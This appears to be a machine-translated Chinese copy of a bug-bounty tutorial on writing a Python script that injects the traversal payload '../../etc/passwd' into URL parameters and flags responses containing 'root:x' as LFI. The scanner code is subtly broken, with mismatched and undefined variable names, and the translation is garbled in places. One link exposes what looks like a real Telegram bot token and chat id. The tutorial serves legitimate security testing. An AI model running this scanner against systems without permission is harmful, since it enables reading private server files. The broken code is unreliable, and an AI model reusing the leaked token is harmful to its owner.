<html>
<head>
<title>How to write a simple script to automate finding bugs</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">如何编写一个简单的脚本来自动查找bug</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-to-write-simple-script-to-automate-finding-bugs-438c121b61cf?source=collection_archive---------0-----------------------#2021-09-26">https://infosecwriteups.com/how-to-write-simple-script-to-automate-finding-bugs-438c121b61cf?source=collection_archive---------0-----------------------#2021-09-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="dac5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi kl translated">今天，我将讨论如何编写一个简单的Python脚本来自动查找bug。我举个例子:&gt;<strong class="jp ir">LFI调查结果</strong>。</p><figure class="kv kw kx ky gt kz gh gi paragraph-image"><div role="button" tabindex="0" class="la lb di lc bf ld"><div class="gh gi ku"><img src="../Images/e2a8baa4c2a62dde1205df3e8bfe3cf1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PLEd81-ePf-3rSoStxxfJg.png"/></div></div></figure></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><h2 id="ebdc" class="ln lo iq bd lp lq lr dn ls lt lu dp lv jy lw lx ly kc lz ma mb kg mc md me mf bi translated">内容</h2><ol class=""><li id="a9af" class="mg mh iq jp b jq mi ju mj jy mk kc ml kg mm kk mn mo mp mq bi translated"><strong class="jp ir">要求</strong></li><li id="072e" class="mg mh iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated"><strong class="jp ir">URL先决条件</strong></li><li id="84da" class="mg mh iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated"><strong class="jp ir">编码</strong></li><li id="6e77" class="mg mh iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated"><strong class="jp ir">奖金选项</strong></li><li id="a1f9" class="mg mh iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated"><strong class="jp ir">谢谢</strong></li></ol></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><h2 id="ebd3" class="ln lo iq bd lp lq lr dn ls lt lu dp lv jy lw lx ly kc lz ma mb kg mc md me mf bi translated">1.要求</h2><ol class=""><li id="bced" class="mg mh iq jp b jq mi ju mj jy mk kc ml kg mm kk mn mo mp mq bi translated"><strong class="jp ir"> Wayback </strong>带参数的URL，可以查看我简单的<a class="ae mw" href="https://eslam3kl.medium.com/simple-recon-methodology-920f5c5936d4" rel="noopener"> <strong class="jp ir">方法论</strong> </a>知道如何抓取。【例如。<a class="ae mw" href="https://example.com?file=ay_value.txt]" rel="noopener ugc nofollow" target="_blank">https://example.com？file=ay_value.txt] </a></li><li id="393a" class="mg mh iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated"><strong class="jp ir"> Python3 </strong>和<strong class="jp ir"> pip3 </strong></li></ol><p id="6a10" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.有用的工具，比如[<strong class="jp ir">GF</strong>/<strong class="jp ir">GF</strong>-<strong class="jp ir">Patterns</strong>/<strong class="jp ir">Uro</strong>，你可以从GitHub获得</p><p id="d664" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们开始吧…</p><blockquote class="mx my mz"><p id="a560" class="jn jo na jp b jq jr js jt ju jv jw jx nb jz ka kb nc kd ke kf nd kh ki kj kk ij bi translated"><strong class="jp ir">警告</strong></p><p id="6515" class="jn jo na jp b jq jr js jt ju jv jw jx nb jz ka kb nc kd ke kf nd kh ki kj kk ij bi translated">首先，我们需要了解，我们将尝试通过收集的GET URLs利用一些GET参数，因此我们不会覆盖所有的应用程序功能，我们仍然有一堆POST请求，这些请求也可能是易受攻击的，所以不要100%依赖于我们将做的事情，<strong class="jp ir">请</strong>！</p></blockquote></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><h2 id="1e76" class="ln lo iq bd lp lq lr dn ls lt lu dp lv jy lw lx ly kc lz ma mb kg mc md me mf bi translated">2.URL先决条件。</h2><p id="2acb" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy ne ka kb kc nf ke kf kg ng ki kj kk ij bi translated">在开始之前，我们需要知道为什么需要使用GF/GF-Patterns/Uro？</p><p id="6076" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们有一个包含1M带参数链接的文件，那么有可能有60%或更多的相似链接，这将浪费你的时间</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="b7da" class="ln lo iq ni b gy nm nn l no np"><a class="ae mw" href="https://example.com?parameter1=lolololo&amp;parameter2=lablablab" rel="noopener ugc nofollow" target="_blank">https://example.com<strong class="ni ir">?parameter1</strong>=lolololo<strong class="ni ir">&amp;parameter2</strong>=lablablab</a><br/>https://example.com<strong class="ni ir">?parameter1</strong>=hhhhhhhhh<strong class="ni ir">&amp;parameter2</strong>=youyouyou</span></pre><p id="520d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">虽然参数是相同的，所以我们只需要其中一个，这是<code class="fe nq nr ns ni b">uro</code>工具的工作，你也可以使用<code class="fe nq nr ns ni b">dpfilter</code>来做同样的工作。</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="33e7" class="ln lo iq ni b gy nm nn l no np"><strong class="ni ir">Usage</strong><br/>cat waybackurls.txt | uro &gt; uro_output<br/>cat waybackurls.txt | dpfilter &gt; dpfilter_output</span></pre><p id="7fe5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">过滤完URL后，我们需要根据流行的参数名称再次过滤它们，例如</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="c3fb" class="ln lo iq ni b gy nm nn l no np"><a class="ae mw" href="https://example.com?file=profile_info.txt" rel="noopener ugc nofollow" target="_blank">https://example.com<strong class="ni ir">?file</strong>=profile_info.txt</a><br/>https://example.com<strong class="ni ir">?search</strong>=I%20am%20not%20LFI%20parameter%20hommie</span></pre><p id="f373" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第一个URL似乎容易受到LFI的攻击，但第二个URL则不然，根据参数名我们可以预计可能有哪些易受攻击的链接。</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="2bdd" class="ln lo iq ni b gy nm nn l no np"><strong class="ni ir">Usage</strong><br/>$ cat uro_output | gf lfi &gt; lfi_gf.txt</span></pre></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><h2 id="f8a8" class="ln lo iq bd lp lq lr dn ls lt lu dp lv jy lw lx ly kc lz ma mb kg mc md me mf bi translated">3.编码</h2><p id="63ef" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy ne ka kb kc nf ke kf kg ng ki kj kk ij bi translated">是时候开始编码了</p><figure class="kv kw kx ky gt kz gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/28a1bd4a06724e35e13d9594f3e7e8a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/format:webp/1*XHT9ApxFQ_0LBqGgFUdYjQ.jpeg"/></div></figure><p id="5939" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们需要这些库:</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="05bb" class="ln lo iq ni b gy nm nn l no np"><strong class="ni ir">import exurl</strong> #replacing parameter values<br/><strong class="ni ir">import sys</strong> #system library <br/><strong class="ni ir">import requests</strong> #send web requests <br/><strong class="ni ir">from termcolor import colored</strong> #coloring<br/><strong class="ni ir">from tqdm import tqdm</strong> #create progress bar</span></pre><p id="9688" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们更多地了解<code class="fe nq nr ns ni b"><a class="ae mw" href="https://pypi.org/project/exurl/?fbclid=IwAR31AiqD5Igw1xKbrcbT3024fRCcdY_n1g7FwF8JoQmKfgbz6_VTQTLGnsU" rel="noopener ugc nofollow" target="_blank">exurl</a></code>..</p><p id="13cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用来把你的有效载荷放在URL的每个参数上，例如如果我们有一个像这样的URL，https://example.com？file=aykalam &amp; doc=zzzzzz，所以我们需要输出每个参数都为<code class="fe nq nr ns ni b">../../../../etc/passwd</code>的有效载荷来创建2个URL。那么<code class="fe nq nr ns ni b">exurl</code>库和<code class="fe nq nr ns ni b">qsreplace</code>工具有什么区别呢。</p><p id="97a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="na">以下是不同之处</em></p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="87ef" class="ln lo iq ni b gy nm nn l no np"><strong class="ni ir">exurl</strong><br/>https://example.com?<strong class="ni ir">file</strong>=../../../../etc/passwd&amp;<strong class="ni ir">doc</strong>=zzzzzz<br/>https://example.com?<strong class="ni ir">file</strong>=aykalam&amp;<strong class="ni ir">doc</strong>=../../../../etc/passwd</span><span id="5d62" class="ln lo iq ni b gy nu nn l no np"><strong class="ni ir">qsreplace<br/></strong>https://example.com?<strong class="ni ir">file</strong>=../../../../etc/passwd<a class="ae mw" href="https://example.com?file=aykalam&amp;doc=zzzzzz" rel="noopener ugc nofollow" target="_blank">&amp;<strong class="ni ir">doc</strong>=</a>../../../../etc/passwd</span></pre><p id="0560" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，你可以知道我的意思是用不同的URL替换每个参数，而不是在同一个URL替换它们。</p><p id="2805" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二步是使用<code class="fe nq nr ns ni b">sys</code>库从用户那里获取URL文件，记住文件必须只包含带参数的链接，因为有我们的作用域。</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="2434" class="ln lo iq ni b gy nm nn l no np">file = sys.argv[1] <strong class="ni ir"># Usage: python3 lfi_check.py &lt;file&gt;</strong></span></pre><p id="3c8a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一步是创建一个函数，将每个URL划分为独立的URL，并在每个参数处替换有效载荷，就像我们上面使用<code class="fe nq nr ns ni b">exurl</code>演示的那样，明白了吗？</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="2030" class="ln lo iq ni b gy nm nn l no np"><strong class="ni ir"># put your payload at a variable </strong><br/>payload = "../../etc/passwd"</span><span id="ff10" class="ln lo iq ni b gy nu nn l no np"><strong class="ni ir"># create a function, you can check the library usage from its docs</strong><br/>def split_file(file, payload):<br/>    with open(file, 'r') as links:<br/>        splitting_urls = exurl.split_urls(links, payload)<br/>        return splitted_urls</span><span id="f742" class="ln lo iq ni b gy nu nn l no np"><strong class="ni ir"># Calling the function<br/></strong>splitted_urls = split_file(file, payload)</span></pre><p id="a5b1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如您所见，它将获取文件，替换每个参数的值，并在名为<code class="fe nq nr ns ni b">splitted_urls</code>的数组中返回输出</p><p id="031c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一步是创建另一个函数，它将接受<code class="fe nq nr ns ni b">splitted_urls</code>并向每个有效负载的URL发送一个请求，并检查有效负载是否工作。</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="ede8" class="ln lo iq ni b gy nm nn l no np"><strong class="ni ir"># create a variable contain user-agent to avoid simulate normal request</strong><br/>user_agent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"</span><span id="7999" class="ln lo iq ni b gy nu nn l no np"><strong class="ni ir"># create a proxy [It's not required]</strong><br/>proxies = {<br/>  "http": "<a class="ae mw" href="http://127.0.0.1:8080" rel="noopener ugc nofollow" target="_blank">http://127.0.0.1:8080</a>"<br/>}</span><span id="c004" class="ln lo iq ni b gy nu nn l no np"><strong class="ni ir">#start the function which will send a GET request to each URL</strong></span><span id="5ed9" class="ln lo iq ni b gy nu nn l no np">def send_request(URL):<br/>    line = line.rstrip()<br/>    headers = {"User-Agent": user_agent}<br/>    try:<br/>        r = requests.get(line, headers=headers, proxies=proxies, verify=False, timeout=15) <strong class="ni ir"># Sending GET request </strong><br/>        content = r.content <strong class="ni ir"># GET Page source code </strong><br/>        if b"root:x" in content:<br/>            print(colored("\n\n[+] Vulnerable :&gt; ", 'red') + line + "\n")<br/>    except KeyboardInterrupt:<br/>        exit()<br/>    except Exception as error:<br/>        # If you have an error, it will print it <br/>        print(line, error)<br/>        pass</span></pre><p id="e78b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，到目前为止，我们有2个函数，一个用于URL拆分，另一个用于向每个URL发送请求。</p><blockquote class="mx my mz"><p id="f26f" class="jn jo na jp b jq jr js jt ju jv jw jx nb jz ka kb nc kd ke kf nd kh ki kj kk ij bi translated">如果你想知道为什么第二个函数不接受一个URL列表，而是通过一个循环发送一个请求，而是一个URL接一个URL，实际上，这取决于进度条函数的用法。</p></blockquote><p id="c6ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后一步是创建一个函数来检查进度并设置一个进度条。</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="7e50" class="ln lo iq ni b gy nm nn l no np"><strong class="ni ir"># Calculate the final array length </strong><br/>array_length = len(splitted_urls)</span><span id="9a3e" class="ln lo iq ni b gy nu nn l no np"><strong class="ni ir"># Progress function</strong><br/>for i in tqdm(range(array_length), desc="Loading...", ascii=False, ncols=75):</span><span id="748d" class="ln lo iq ni b gy nu nn l no np">line = splitted_urls[i] <strong class="ni ir"># Take the first URL</strong><br/>    send_request(line) <strong class="ni ir"># Call the function </strong><br/>print(colored("\nEslam! We have finished\n", "green", attrs=['bold'])) <strong class="ni ir"># Print this message after you have done.</strong></span></pre><p id="16e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们总结一下我们已经做了什么，首先，我们获取一个带有参数的URL文件，并将它们传递给<code class="fe nq nr ns ni b">exurl</code>一个库，该库用有效载荷<code class="fe nq nr ns ni b">../../../../etc/passwd</code>替换每个参数的值</p><p id="84be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">之后，它会调用一个函数向每个付费URL发送一个请求，并检查我们是否在响应中有一个自定义单词，如果有，它会打印易受攻击的URL，如果没有，它会传递给另一个。</p><p id="8654" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了了解我们的进展，我们创建了一个进度条，以了解已完成的URL的百分比以及完成该过程的预期时间。</p><p id="1d99" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">最终代码将为</strong></p><figure class="kv kw kx ky gt kz"><div class="bz fp l di"><div class="nv nw l"/></div></figure><p id="d2c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在尝试使用包含21个链接的文件和创建28个链接后，我们发现了一个易受攻击的链接</p><figure class="kv kw kx ky gt kz gh gi paragraph-image"><div role="button" tabindex="0" class="la lb di lc bf ld"><div class="gh gi nx"><img src="../Images/dc95e51266eb79157f66af5071cfe8ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*idyyQ0EGRqJvDmElVhj3fg.png"/></div></div></figure></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><h2 id="c2c0" class="ln lo iq bd lp lq lr dn ls lt lu dp lv jy lw lx ly kc lz ma mb kg mc md me mf bi translated">红利期权</h2><ol class=""><li id="3d63" class="mg mh iq jp b jq mi ju mj jy mk kc ml kg mm kk mn mo mp mq bi translated">您可以在一个数组中添加多个LFI有效负载，并使用for循环遍历它们，在每个URL尝试每个有效负载</li><li id="efb7" class="mg mh iq jp b jq mr ju ms jy mt kc mu kg mv kk mn mo mp mq bi translated">您可以在一个数组中添加多个用户代理，并在每次请求时根据您的用户代理随机选择一个以避免阻塞，您可以使用<code class="fe nq nr ns ni b">random</code>库来执行此步骤</li></ol><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="50d0" class="ln lo iq ni b gy nm nn l no np">import random <br/>user_agent_list = ["Multiple User Agents"]<br/>user_agent_random =random.choice(user_agent_list)<br/>headers = {"User-Agent": str(user_agent_random)}</span></pre><p id="7929" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.您可以使用Telegram bot令牌来通知您它是否发现了一个易受攻击的链接，或者如果它完成了，使用<code class="fe nq nr ns ni b">subprocess</code>库来执行<code class="fe nq nr ns ni b">curl</code>命令。</p><pre class="kv kw kx ky gt nh ni nj nk aw nl bi"><span id="2b21" class="ln lo iq ni b gy nm nn l no np">subprocess.call('curl -s "<a class="ae mw" href="https://api.telegram.org/bot1875655001:AAHQub53HxAw4ckmPQMXBTSIaVtCuvyTHwQ/sendMessage?chat_id=971620208&amp;text=LFI" rel="noopener ugc nofollow" target="_blank">https://api.telegram.org/&lt;token&gt;/sendMessage?chat_id=&lt;chat-id&gt;&amp;text=</a>"Message"', shell=True)</span></pre></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><h2 id="2698" class="ln lo iq bd lp lq lr dn ls lt lu dp lv jy lw lx ly kc lz ma mb kg mc md me mf bi translated">由于</h2><p id="ca8c" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy ne ka kb kc nf ke kf kg ng ki kj kk ij bi translated"><a class="ae mw" href="https://pypi.org/user/Abdulrahman-Kamel/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir">阿卜杜勒拉赫曼·卡迈勒</strong> </a>为了他伟大的图书馆<code class="fe nq nr ns ni b">exurl</code>和他的努力。</p></div><div class="ab cl lg lh hu li" role="separator"><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll lm"/><span class="lj bw bk lk ll"/></div><div class="ij ik il im in"><h2 id="38e4" class="ln lo iq bd lp lq lr dn ls lt lu dp lv jy lw lx ly kc lz ma mb kg mc md me mf bi translated">保持联系</h2><p id="2ac4" class="pw-post-body-paragraph jn jo iq jp b jq mi js jt ju mj jw jx jy ne ka kb kc nf ke kf kg ng ki kj kk ij bi translated"><a class="ae mw" href="https://www.linkedin.com/in/eslam-akl-6b998614a/" rel="noopener ugc nofollow" target="_blank">LinkedIn</a>|<a class="ae mw" href="https://github.com/eslam3kl" rel="noopener ugc nofollow" target="_blank">GitHub</a>|<a class="ae mw" href="https://twitter.com/eslam3kll" rel="noopener ugc nofollow" target="_blank">Twitter</a></p></div></div>    
</body>
</html>